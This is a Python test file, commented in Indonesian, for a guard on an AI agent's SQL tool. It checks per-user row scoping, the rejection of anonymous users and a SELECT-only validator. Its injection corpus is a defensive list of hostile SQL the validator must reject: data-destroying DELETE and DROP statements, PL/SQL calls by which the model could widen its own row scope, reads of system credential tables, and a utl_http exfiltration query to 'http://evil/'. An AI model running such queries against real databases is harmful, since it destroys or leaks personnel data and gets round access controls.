"""Penjaga tool basis data agent: tolak anonim, saring baris per unit.

Tiga hal ditegakkan di guard_db_access (di atas VPD Oracle di
oracle/03-row-scope.sql):
  1. PUBLIC (anonim) DITOLAK - tool basis data tak jalan.
  2. Sebelum SQL model, konteks penyaring-baris disetel dari identitas
     TERVERIFIKASI (set_identity NIP / set_operator), lalu SQL model jalan.
  3. SQL model divalidasi SELECT-tunggal - supaya ia tak bisa memanggil
     rag_scope untuk mengganti konteks penyaring itu sendiri.

Diuji tanpa MCP/Oracle: tool dalam diganti fake yang MEREKAM setiap SQL.
"""
from __future__ import annotations

import asyncio

from pydantic import BaseModel

from ragcore.agent.hybrid import _is_safe_select, guard_db_access
from ragcore.agent.tools_hybrid import ACTIVE_USER
from ragcore.domain.users import PUBLIC, REGISTRY


class _SqlArgs(BaseModel):
    sql: str = ""


class _FakeTool:
    name = "sql_run"
    description = "jalankan SQL"
    args_schema = _SqlArgs

    def __init__(self):
        self.sqls: list[str] = []

    async def ainvoke(self, kwargs):
        self.sqls.append(kwargs["sql"])
        return "HASIL SQL"


# ---------------------------------------------------- penolakan & scope

def test_tool_db_menolak_publik():
    inner = _FakeTool()
    guarded = guard_db_access(inner)
    ACTIVE_USER.set(PUBLIC)
    out = asyncio.run(guarded.ainvoke({"sql": "SELECT * FROM ncs.v_karyawan"}))
    assert "DITOLAK" in out
    assert inner.sqls == []                    # tak ada SQL yang jalan


def test_user_menyetel_scope_nip_lalu_query():
    inner = _FakeTool()
    guarded = guard_db_access(inner)
    nip = next(iter(REGISTRY))
    ACTIVE_USER.set(REGISTRY[nip])
    out = asyncio.run(guarded.ainvoke({"sql": "SELECT nama FROM ncs.v_karyawan"}))
    assert out == "HASIL SQL"
    # Dua SQL: setel konteks identitas DULU, lalu SELECT model.
    assert len(inner.sqls) == 2
    assert f"set_identity('{nip}')" in inner.sqls[0]
    assert inner.sqls[1] == "SELECT nama FROM ncs.v_karyawan"


def test_operator_none_menyetel_scope_all():
    inner = _FakeTool()
    guarded = guard_db_access(inner)
    ACTIVE_USER.set(None)
    asyncio.run(guarded.ainvoke({"sql": "SELECT * FROM ncs.v_cuti"}))
    assert "set_operator" in inner.sqls[0]     # operator -> lihat semua
    assert inner.sqls[1] == "SELECT * FROM ncs.v_cuti"


# ---------------------------------------------------- validasi SELECT-only

def test_sql_non_select_ditolak():
    inner = _FakeTool()
    guarded = guard_db_access(inner)
    ACTIVE_USER.set(REGISTRY[next(iter(REGISTRY))])
    # Upaya model mengganti konteks -> ditolak, TAK ADA SQL yang jalan.
    out = asyncio.run(guarded.ainvoke(
        {"sql": "BEGIN ncs.rag_scope.set_operator; END;"}))
    assert "DITOLAK" in out
    assert inner.sqls == []


def test_validasi_select_only():
    assert _is_safe_select("SELECT * FROM ncs.v_karyawan")
    assert _is_safe_select("  with x as (select 1 from dual) select * from x")
    assert not _is_safe_select("BEGIN ncs.rag_scope.set_operator; END;")
    assert not _is_safe_select("SELECT 1 FROM dual; DROP TABLE ncs.karyawan")
    assert not _is_safe_select("EXEC ncs.rag_scope.set_identity('NCS-0001')")
    assert not _is_safe_select("")


# ---------------------------------------------------- korpus injeksi (C-07)

# Kueri SAH yang model sungguh tulis - JOIN antar-view, CTE, aritmetika tanggal
# lewat dual, agregat. Ini penjaga false-positive: pengetatan validator tidak
# boleh menolak satu pun dari ini, atau agent lumpuh di kasus yang benar.
KUERI_SAH = (
    "SELECT nama, golongan FROM ncs.v_karyawan WHERE unit = 'Divisi Keuangan'",
    "SELECT nomor_po FROM ncs.v_pengadaan WHERE unit = 'Divisi TI'",
    "SELECT COUNT(*) FROM ncs.v_cuti WHERE tanggal_ajuan >= DATE '2026-07-01'",
    "SELECT k.nama, SUM(l.jam) FROM ncs.v_lembur l "
    "JOIN ncs.v_karyawan k ON k.nama = l.nama GROUP BY k.nama",
    "WITH x AS (SELECT nama FROM ncs.v_karyawan) SELECT * FROM x",
    "SELECT (tanggal_kembali - tanggal_berangkat) FROM ncs.v_sppd "
    "WHERE nomor_sppd = 'SPPD-2026-0230'",
)

# Korpus serangan. Tiap baris HARUS ditolak validator lapis-aplikasi, sebelum
# menyentuh basis data - meski grant DB rag_baca juga menutupnya di bawah.
KORPUS_INJEKSI = (
    # tulis / DDL
    "DELETE FROM ncs.pengadaan",
    "UPDATE ncs.v_karyawan SET golongan='Direksi'",
    "DROP TABLE ncs.karyawan",
    # eskalasi scope lewat PL/SQL
    "BEGIN ncs.rag_scope.set_operator; END;",
    "EXEC ncs.rag_scope.set_identity('NCS-0001')",
    # banyak-pernyataan
    "SELECT 1 FROM dual; DROP TABLE ncs.cuti",
    "SELECT * FROM ncs.v_karyawan; DELETE FROM ncs.cuti",
    # tabel MENTAH (bukan view) - lewati VPD kalau grant bocor
    "SELECT * FROM ncs.karyawan",
    "SELECT gaji FROM ncs.karyawan",
    "SELECT * FROM ncs.v_karyawan UNION SELECT * FROM ncs.cuti",
    # katalog / skema sistem & eksfiltrasi jaringan
    "SELECT * FROM v$session",
    "SELECT * FROM all_tables",
    "SELECT * FROM dba_users",
    "SELECT * FROM sys.user$",
    "SELECT username FROM all_users",
    "SELECT utl_http.request('http://evil/'||nama) FROM ncs.v_karyawan",
)


def test_kueri_view_sah_semua_lolos():
    for q in KUERI_SAH:
        assert _is_safe_select(q), f"false-positive: {q}"


def test_korpus_injeksi_semua_ditolak():
    for q in KORPUS_INJEKSI:
        assert not _is_safe_select(q), f"LOLOS - seharusnya ditolak: {q}"


def test_tabel_mentah_ditolak_tanpa_menyentuh_db():
    """Referensi tabel mentah (bukan view) ditolak di aplikasi, dan TAK ADA SQL
    yang sampai ke basis data - bukan hanya mengandalkan ORA-00942."""
    inner = _FakeTool()
    guarded = guard_db_access(inner)
    ACTIVE_USER.set(REGISTRY[next(iter(REGISTRY))])
    out = asyncio.run(guarded.ainvoke({"sql": "SELECT gaji FROM ncs.karyawan"}))
    assert "DITOLAK" in out
    assert inner.sqls == []


# ------------------------------------ pemisahan akun query/operator (F-02)

def test_config_menyediakan_koneksi_operator_terpisah():
    """Penutupan penuh F-02: ada koneksi + kredensial operator terpisah dari
    akun query produksi (oracle/04-operator-account.sql)."""
    from ragcore import config

    assert hasattr(config, "MCP_CONNECTION_OPERATOR")
    assert hasattr(config, "ORACLE_CONNECTION_OPERATOR")


def test_tool_source_produksi_memakai_akun_hak_minimal():
    """Produksi (/agent/ask) memakai akun rag_baca yang TAK BISA 'lihat semua';
    hanya jalur non-produksi (CLI/eval) yang opt-in ke koneksi operator."""
    from ragcore.application.wiring import _McpToolSource

    assert _McpToolSource()._operator is False              # produksi = rag_baca
    assert _McpToolSource(operator=True)._operator is True   # CLI/eval = rag_operator


# ---------------------------------------------------- reconnect + re-scope

class _FlakyTool:
    """Tool DB yang sesinya 'terputus' pada SELECT pertama, pulih di kedua."""
    name = "sql_run"
    description = "jalankan SQL"
    args_schema = _SqlArgs

    def __init__(self):
        self.sqls: list[str] = []
        self.select_calls = 0

    async def ainvoke(self, kwargs):
        sql = kwargs["sql"]
        self.sqls.append(sql)
        if sql.strip().lower().startswith("begin"):
            return "ok"                         # panggilan setel-scope
        self.select_calls += 1
        return "Connection not established" if self.select_calls == 1 else "HASIL"


def test_reconnect_memasang_ulang_scope():
    """Bila sesi putus di antara setel-scope dan SELECT, guard menyambung ulang
    LALU memasang scope lagi - bukan menjalankan ulang SELECT dengan rag_ctx
    kosong (yang akan balik 0 baris diam-diam)."""
    tool = _FlakyTool()
    calls = {"connect": 0}

    async def fake_connect():
        calls["connect"] += 1

    guarded = guard_db_access(tool, connect=fake_connect)
    ACTIVE_USER.set(REGISTRY[next(iter(REGISTRY))])
    out = asyncio.run(guarded.ainvoke({"sql": "SELECT unit FROM ncs.v_karyawan"}))

    assert out == "HASIL"
    assert calls["connect"] == 1                 # menyambung ulang sekali
    # scope dipasang DUA kali - sebelum tiap percobaan SELECT
    assert sum(s.lower().startswith("begin") for s in tool.sqls) == 2
    assert tool.select_calls == 2
